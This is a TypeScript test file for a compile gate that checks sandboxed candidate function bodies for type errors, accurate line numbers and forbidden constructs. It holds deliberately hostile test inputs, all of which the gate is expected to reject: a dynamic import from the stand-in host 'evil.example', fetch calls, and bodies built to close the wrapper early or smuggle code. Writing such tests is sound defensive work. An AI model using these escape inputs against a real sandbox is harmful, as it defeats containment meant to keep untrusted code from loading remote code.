import { beforeAll, describe, expect, it } from 'vitest';
import type { Diagnostic, FunctionSpec } from '../types';
import { compileCandidate, transpileUserCode, warmUp } from './compile';
import { emptySpec, specFromCall } from './source';

const median: FunctionSpec = {
  ...emptySpec('median'),
  params: [{ name: 'numbers', type: 'number[]' }],
  returns: 'number',
  origin: 'user',
};

const MEDIAN_BODY = `if (numbers.length === 0) throw new RangeError('empty');
const s = [...numbers].sort((a, b) => a - b);
const mid = Math.floor(s.length / 2);
return s.length % 2 === 1 ? s[mid]! : (s[mid - 1]! + s[mid]!) / 2;`;

type CompileDiag = Extract<Diagnostic, { kind: 'compile' }>;
const diags = (d: Diagnostic[]): CompileDiag[] => d.filter((x): x is CompileDiag => x.kind === 'compile');

/** Load the emitted JS the same way the sandbox does: a strict-mode function declaration, returned by name. */
function load<T>(js: string, name: string): T {
  return new Function(`${js}\nreturn ${name};`)() as T;
}

describe('compileCandidate', () => {
  let coldMs = 0;
  beforeAll(async () => {
    const t = performance.now();
    await warmUp();
    coldMs = performance.now() - t;
  }, 30_000);

  it('passes a correct median and emits JS that computes correctly', async () => {
    const r = await compileCandidate(median, MEDIAN_BODY);
    expect(r.gate).toMatchObject({ gate: 'compile', status: 'pass', summary: '0 errors', diagnostics: [] });
    expect(r.gate.headline).toBeUndefined();
    expect(r.returnType).toBe('number');
    expect(r.source.startsWith('function median(numbers: number[]): number\n{\n')).toBe(true);
    expect(r.js).toMatch(/^"use strict";/);
    expect(r.js).not.toMatch(/: number|import|export/);
    const fn = load<(xs: number[]) => number>(r.js!, 'median');
    expect(fn([3, 1, 2])).toBe(2);
    expect(fn([4, 1, 2, 3])).toBe(2.5);
    expect(() => fn([])).toThrow(RangeError);
  });

  it('rejects a type error with body-relative line/col and a headline', async () => {
    const r = await compileCandidate(median, "const n = numbers.length;\n  return 'x';");
    expect(r.gate.status).toBe('fail');
    expect(r.js).toBeNull();
    const [d] = diags(r.gate.diagnostics);
    expect(d).toMatchObject({ code: 2322, category: 'error', line: 2, col: 3, endLine: 2, endCol: 9, snippet: "  return 'x';" });
    expect(d!.message).toBe("Type 'string' is not assignable to type 'number'.");
    expect(r.gate.headline).toBe("Rejected: line 2: Type 'string' is not assignable to type 'number'.");
    expect(r.gate.summary).toBe('1 error');
  });

  it('maps every line of a multi-line body, and counts errors in the summary', async () => {
    const body = [
      'let total = 0;',            // 1
      'for (const n of numbers) {', // 2
      '    total += n;',            // 3
      '    const bad: string = n;', // 4
      '}',                          // 5
      'return total + missing;',    // 6
    ].join('\n');
    const r = await compileCandidate(median, body);
    const ds = diags(r.gate.diagnostics);
    expect(ds.map((d) => [d.code, d.line, d.col])).toEqual([[2322, 4, 11], [2304, 6, 16]]);
    expect(ds[1]!.snippet).toBe('return total + missing;');
    expect(ds[1]!.endCol).toBe(ds[1]!.col + 'missing'.length);
    expect(r.gate.summary).toBe('2 errors');
    expect(r.gate.headline).toBe("Rejected: line 4: Type 'number' is not assignable to type 'string'.");
  });

  it('rejects a missing return; signature-located errors map to body line 1', async () => {
    const r = await compileCandidate(median, 'const s = numbers.slice();\ns.sort();');
    expect(r.gate.status).toBe('fail');
    const [d] = diags(r.gate.diagnostics);
    expect(d!.code).toBe(2355);
    expect(d).toMatchObject({ line: 1, col: 1, snippet: 'const s = numbers.slice();' });
  });

  it('rejects implicit-return paths (noImplicitReturns)', async () => {
    const r = await compileCandidate(median, 'if (numbers.length > 0) {\n  return numbers[0]!;\n}');
    expect(r.gate.status).toBe('fail');
    expect(diags(r.gate.diagnostics).map((d) => d.code)).toContain(2366);
  });

  it.each([
    ['fetch', "fetch('https://example.com');\nreturn 1;"],
    ['window', 'return window.innerWidth;'],
    ['document', 'return document.title.length;'],
    ['process', 'return Number(process.env.X);'],
    ['setTimeout', 'setTimeout(() => {}, 1);\nreturn 1;'],
  ])('rejects use of %s (no DOM / Node globals in lib es2022)', async (name, body) => {
    const r = await compileCandidate(median, body);
    expect(r.gate.status).toBe('fail');
    const d = diags(r.gate.diagnostics).find((x) => x.message.includes(`'${name}'`));
    expect(d, JSON.stringify(r.gate.diagnostics)).toBeDefined();
    expect([2304, 2580, 2584, 2591]).toContain(d!.code);
  });

  it('rejects implicit any', async () => {
    const r = await compileCandidate(median, 'const f = function (x) { return x; };\nreturn f(1);');
    expect(r.gate.status).toBe('fail');
    expect(diags(r.gate.diagnostics)[0]).toMatchObject({ code: 7006, line: 1 });
  });

  it('enforces strict null checks', async () => {
    const r = await compileCandidate(median, 'const m = new Map<string, number>();\nreturn m.get("a") + 1;');
    expect(r.gate.status).toBe('fail');
    const [d] = diags(r.gate.diagnostics);
    expect(d!.line).toBe(2);
    expect([2532, 18048]).toContain(d!.code); // "Object is possibly 'undefined'" / "'x' is possibly 'undefined'"
  });

  it('infers the return type when returns is null', async () => {
    const add = specFromCall('add', ['number', 'number']);
    const r = await compileCandidate(add, 'return arg0 + arg1;');
    expect(r.gate.status).toBe('pass');
    expect(r.returnType).toBe('number');
    expect(load<(a: number, b: number) => number>(r.js!, 'add')(2, 3)).toBe(5);

    const first = specFromCall('firstWord', ['string[]']);
    const r2 = await compileCandidate(first, 'for (const w of arg0) {\n  if (w.length > 0) return w;\n}\nreturn undefined;');
    expect(r2.gate.status).toBe('pass');
    expect(r2.returnType).toBe('string | undefined');

    const pair = specFromCall('pair', ['number']);
    const r3 = await compileCandidate(pair, 'return { value: arg0, label: String(arg0), tags: [] as string[] };');
    expect(r3.returnType).toBe('{ value: number; label: string; tags: string[]; }');
  });

  it('rejects a body that is a whole nested declaration of the same function, readably', async () => {
    const body = 'function median(numbers: number[]): number {\n  return numbers[0]!;\n}';
    const r = await compileCandidate(median, body);
    expect(r.gate.status).toBe('fail');
    expect(r.gate.headline).toMatch(/^Rejected: line 1: The body declares a nested function 'median'/);
    const [d] = diags(r.gate.diagnostics);
    expect(d).toMatchObject({ code: 0, line: 1, col: 1, endLine: 3, endCol: 2 });

    // With no declared return type tsc alone would accept it (inferring void); the harness still rejects.
    const r2 = await compileCandidate({ ...median, returns: null }, body);
    expect(r2.gate.status).toBe('fail');
    expect(r2.returnType).toBe('void');
  });

  it('rejects an empty body even when tsc would accept it as void', async () => {
    const r = await compileCandidate(specFromCall('f', ['number']), '  // nothing here\n');
    expect(r.gate.status).toBe('fail');
    expect(r.gate.headline).toBe('Rejected: line 1: The body is empty: it has no statements.');
  });

  it('cannot infer a self-recursive return type (TS7023) — declare returns for recursive functions', async () => {
    const r = await compileCandidate(specFromCall('fib', ['number']), 'return arg0 < 2 ? arg0 : fib(arg0 - 1) + fib(arg0 - 2);');
    expect(r.gate.status).toBe('fail');
    expect(diags(r.gate.diagnostics)[0]!.code).toBe(7023);
  });

  it('rejects a body that closes the wrapper early', async () => {
    const r = await compileCandidate(median, 'return 1;\n}\nfunction escaped() {\n  return 2;');
    expect(r.gate.status).toBe('fail');
    expect(r.gate.headline).toMatch(/^Rejected: line 3: The body closes the function early/);
  });

  it('reports syntax errors with body lines; errors at the closing brace map to the last body line', async () => {
    const r = await compileCandidate(median, 'const a = [1, 2;\nreturn a[0]!;');
    expect(diags(r.gate.diagnostics)[0]).toMatchObject({ code: 1005, line: 1 });

    const r2 = await compileCandidate(median, 'if (numbers.length) {\n  return 1;\n\n');
    expect(r2.gate.status).toBe('fail');
    const d = diags(r2.gate.diagnostics)[0]!;
    expect(d.code).toBe(1005);
    expect(d.line).toBe(2);
    expect(d.snippet).toBe('  return 1;');
  });

  it('rejects dynamic import() and import.meta via the AST, not a string match', async () => {
    const r = await compileCandidate(median, `const m = 'data:text/javascript,export default 1';\nvoid import(m);\nreturn numbers.length;`);
    expect(r.gate.status).toBe('fail');
    expect(r.js).toBeNull();
    expect(diags(r.gate.diagnostics)[0]).toMatchObject({ code: 0, line: 2, message: 'dynamic import is not allowed in a candidate' });
    expect(r.gate.headline).toBe('Rejected: line 2: dynamic import is not allowed in a candidate');

    const meta = await compileCandidate(median, `const u: unknown = import.meta;\nreturn u ? 1 : 0;`);
    expect(meta.gate.status).toBe('fail');
    expect(diags(meta.gate.diagnostics)[0]).toMatchObject({ code: 0, line: 1, message: 'import.meta is not allowed in a candidate' });

    // The word "import" in a string, a comment or a property name is fine.
    const ok = await compileCandidate(median, `const o = { import: 1 }; // import("x")\nreturn o.import + 'import(1)'.length + numbers.length;`);
    expect(ok.gate.status).toBe('pass');
  });

  it('allows recursion by its own name', async () => {
    const fib = specFromCall('fib', ['number']);
    const r = await compileCandidate({ ...fib, returns: 'number' }, 'return arg0 < 2 ? arg0 : fib(arg0 - 1) + fib(arg0 - 2);');
    expect(r.gate.status).toBe('pass');
    expect(load<(n: number) => number>(r.js!, 'fib')(10)).toBe(55);
  });

  it('is fast once warm (and reports cold/warm timings)', async () => {
    const times: number[] = [];
    for (let i = 0; i < 5; i++) {
      const t = performance.now();
      await compileCandidate(median, `${MEDIAN_BODY}\n// ${i}`);
      times.push(performance.now() - t);
    }
    const warm = Math.max(...times.slice(1));
    console.log(`compile timings: cold (warmUp incl. load) ${coldMs.toFixed(0)} ms, warm max ${warm.toFixed(1)} ms`);
    expect(warm).toBeLessThan(150);
  });
});

describe('transpileUserCode', () => {
  beforeAll(() => warmUp(), 30_000);

  it('returns empty js for empty or blank source', () => {
    expect(transpileUserCode('')).toEqual({ js: '' });
    expect(transpileUserCode('  \n')).toEqual({ js: '' });
  });

  it('strips types and produces a plain script that runs', () => {
    const src = `interface Case { input: number[]; out: number }
const cases: Case[] = [{ input: [1, 2, 3], out: 2 }];
for (const c of cases) test('case ' + c.out, () => eq(median(c.input), c.out as number));`;
    const r = transpileUserCode(src);
    expect(r.error).toBeUndefined();
    expect(r.js).not.toMatch(/interface|: Case|as number|exports|import|export/);
    const seen: string[] = [];
    new Function('test', 'eq', 'median', r.js)(
      (name: string, body: () => void) => { seen.push(name); body(); },
      (a: unknown, b: unknown) => { if (a !== b) throw new Error(`${String(a)} !== ${String(b)}`); },
      (xs: number[]) => xs[1],
    );
    expect(seen).toEqual(['case 2']);
  });

  it('reports syntax errors as "line N: message"', () => {
    const r = transpileUserCode("test('a', () => {\n  eq(1, 1);\n  eq(2,, 2);\n});");
    expect(r.error).toBe('line 3: Argument expression expected.');
  });

  it('rejects module syntax with a line number', () => {
    const r = transpileUserCode("const x = 1;\nimport fc2 from 'fast-check';");
    expect(r.error).toMatch(/^line 2: import\/export statements are not supported/);
    expect(transpileUserCode('export const y = 2;').error).toMatch(/^line 1: /);
  });

  it('rejects dynamic import() and import.meta (same AST walk as the candidate check)', () => {
    const r = transpileUserCode("test('t', () => {\n  eq(1, 1);\n  void import('https://evil.example/x.js');\n});");
    expect(r).toEqual({ js: '', error: 'line 3: dynamic import is not allowed in tests or properties' });
    expect(transpileUserCode("property('p', [fc.nat()], () => !!import.meta.url);").error).toBe(
      'line 1: import.meta is not allowed in tests or properties',
    );
    // the word in strings, comments and property names is fine
    const ok = transpileUserCode("// import('x')\ntest('import(1)', () => eq({ import: 1 }.import, 1));");
    expect(ok.error).toBeUndefined();
  });
});

describe('compileCandidate with spec.typeDecls', () => {
  beforeAll(async () => {
    await warmUp();
  }, 30_000);

  const ROW_DECL = 'type Row = {\n  customer: string;\n  total: number;\n}';
  const topCustomer: FunctionSpec = {
    ...specFromCall('topCustomer', ['Row[]'], { typeDecls: ROW_DECL }),
    returns: 'string',
  };

  it('compiles a body that uses the declared Row type and emits JS without the declaration', async () => {
    const body = 'let best: Row | undefined;\nfor (const r of arg0) if (!best || r.total > best.total) best = r;\nreturn best ? best.customer : "";';
    const r = await compileCandidate(topCustomer, body);
    expect(r.gate.status).toBe('pass');
    expect(r.source.startsWith(`${ROW_DECL}\nfunction topCustomer(arg0: Row[]): string\n{\n`)).toBe(true);
    expect(r.js).not.toMatch(/type Row|customer: string/);
    const fn = load<(rows: Array<{ customer: string; total: number }>) => string>(r.js!, 'topCustomer');
    expect(fn([{ customer: 'a', total: 1 }, { customer: 'b', total: 5 }])).toBe('b');
  });

  it('keeps diagnostics BODY-relative when declarations are prepended', async () => {
    const body = 'const first = arg0[0];\n  const n: number = first.customer;\n  return String(n);';
    const r = await compileCandidate(topCustomer, body);
    expect(r.gate.status).toBe('fail');
    const [d] = diags(r.gate.diagnostics);
    expect(d).toMatchObject({ code: 2322, line: 2, col: 9, snippet: '  const n: number = first.customer;' });
    expect(r.gate.headline).toBe("Rejected: line 2: Type 'string' is not assignable to type 'number'.");
  });

  it('infers the return type of the function, not of the declaration', async () => {
    const r = await compileCandidate({ ...topCustomer, returns: null }, 'return arg0.map((r) => r.total);');
    expect(r.gate.status).toBe('pass');
    expect(r.returnType).toBe('number[]');
  });

  it('reports an error inside typeDecls as such, never on a body line it does not belong to', async () => {
    const spec = { ...topCustomer, typeDecls: 'type Row = { customer: string; total: Missing }' };
    const r = await compileCandidate(spec, 'return arg0[0]!.customer;');
    expect(r.gate.status).toBe('fail');
    const [d] = diags(r.gate.diagnostics);
    expect(d!.message).toMatch(/^in the type declarations \(typeDecls\): Cannot find name 'Missing'/);
    expect(d!.line).toBe(1);
  });

  it('rejects typeDecls that contain code, not only types', async () => {
    const spec = { ...topCustomer, typeDecls: 'type Row = { customer: string; total: number }\nconst leak = 1;' };
    const r = await compileCandidate(spec, 'return arg0[0]!.customer;');
    expect(r.gate.status).toBe('fail');
    expect(diags(r.gate.diagnostics)[0]!.message).toMatch(/only `type` and `interface`/);
  });

  it('still flags code after an early-closing body when declarations are present', async () => {
    const r = await compileCandidate(topCustomer, 'return "";\n}\nfunction other() {');
    expect(r.gate.status).toBe('fail');
    expect(diags(r.gate.diagnostics).some((d) => /closes the function early/.test(d.message))).toBe(true);
  });
});
